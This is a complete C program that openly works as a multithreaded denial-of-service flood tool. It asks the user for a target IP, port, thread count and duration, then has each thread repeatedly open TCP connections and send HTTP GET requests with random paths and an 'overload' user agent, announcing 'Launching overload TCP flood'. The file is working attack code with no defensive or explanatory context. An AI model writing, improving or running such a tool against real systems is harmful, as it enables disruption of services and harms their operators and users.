#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>

#define PAYLOAD_LEN 1024

char *target_ip;
int target_port, thread_count, duration;

char *random_payload() {
    static char payload[PAYLOAD_LEN];
    for (int i = 0; i < PAYLOAD_LEN - 1; i++) {
        payload[i] = 'A' + rand() % 26;
    }
    payload[PAYLOAD_LEN - 1] = '\0';
    return payload;
}

void *flood(void *arg) {
    time_t end_time = time(NULL) + duration;

    while (time(NULL) < end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(target_port);
        server.sin_addr.s_addr = inet_addr(target_ip);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
            char payload[2048];
            snprintf(payload, sizeof(payload),
                     "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: overload\r\nConnection: keep-alive\r\n\r\n",
                     random_payload(), target_ip);
            send(sock, payload, strlen(payload), 0);
        }

        close(sock);
    }

    return NULL;
}

int main() {
    srand(time(NULL));
    char ip_buf[64];

    printf("Target IP: ");
    fgets(ip_buf, sizeof(ip_buf), stdin);
    ip_buf[strcspn(ip_buf, "\n")] = '\0';
    target_ip = strdup(ip_buf);

    printf("Port: ");
    scanf("%d", &target_port);
    printf("Threads: ");
    scanf("%d", &thread_count);
    printf("Duration (seconds): ");
    scanf("%d", &duration);

    printf("[+] Launching overload TCP flood on %s:%d (%d threads, %d seconds)\n",
           target_ip, target_port, thread_count, duration);

    pthread_t threads[thread_count];
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    free(target_ip);
    return 0;
}
